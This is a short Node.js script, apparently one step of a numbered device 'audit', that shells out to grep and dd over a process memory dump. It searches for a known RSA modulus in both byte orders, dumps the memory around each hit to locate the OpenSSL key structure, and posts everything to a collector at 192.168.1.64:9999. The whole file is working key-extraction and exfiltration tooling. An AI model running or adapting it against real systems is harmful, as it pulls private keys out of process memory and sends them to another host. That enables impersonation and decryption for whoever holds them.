"use strict";
// audit102.js - find RSA modulus in acr memory, dump surrounding BIGNUM/RSA struct.
// Modulus starts with CA 5C 7D 76. In OpenSSL BIGNUM (32-bit LE limbs), search
// for both BE and LE representations. Once found, dump 1KB around it.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// Modulus first 8 bytes: CA 5C 7D 76 60 F9 9B AD
// In memory as BE (raw DER): CA 5C 7D 76 60 F9 9B AD
// In memory as LE limbs: each 4-byte chunk reversed: 76 7D 5C CA AD 9B F9 60

// search for BE modulus prefix in acr mem
out.be_search = sh("grep -aob $'\\xCA\\x5C\\x7D\\x76\\x60\\xF9\\x9B\\xAD' /tmp/acr_mem2.bin | head -10", 2000);

// search for LE limb representation
out.le_search = sh("grep -aob $'\\x76\\x7D\\x5C\\xCA\\xAD\\x9B\\xF9\\x60' /tmp/acr_mem2.bin | head -10", 2000);

// also search for distinctive middle bytes: BBD701E8BF97CDAD
out.mid_be = sh("grep -aob $'\\xBB\\xD7\\x01\\xE8\\xBF\\x97\\xCD\\xAD' /tmp/acr_mem2.bin | head -10", 2000);
out.mid_le = sh("grep -aob $'\\xAD\\xCD\\x97\\xBF\\xE8\\x01\\xD7\\xBB' /tmp/acr_mem2.bin | head -10", 2000);

// search for modulus ending bytes: 38F93B (from ...827FE85F338F93B)
// last 4 bytes of 256-byte modulus = 38 F9 93 B? need to pad
// Let me search for 5F 33 8F 93
out.end_search = sh("grep -aob $'\\x5F\\x33\\x8F\\x93' /tmp/acr_mem2.bin | head -10", 2000);

// dump context around any BE hits
out.context = sh("for off in $(grep -aob $'\\xCA\\x5C\\x7D\\x76' /tmp/acr_mem2.bin 2>/dev/null | head -5 | cut -d: -f1); do echo \"=== BE offset $off\"; dd if=/tmp/acr_mem2.bin bs=1 skip=$((off > 256 ? off-256 : 0)) count=1024 2>/dev/null | od -A x -t x1z | head -30; done", 6000);

// dump context around LE hits
out.context_le = sh("for off in $(grep -aob $'\\x76\\x7D\\x5C\\xCA' /tmp/acr_mem2.bin 2>/dev/null | head -5 | cut -d: -f1); do echo \"=== LE offset $off\"; dd if=/tmp/acr_mem2.bin bs=1 skip=$((off > 256 ? off-256 : 0)) count=1024 2>/dev/null | od -A x -t x1z | head -30; done", 6000);

post("/p102_modsearch", out);
post("/p102_done", { started: out.started });
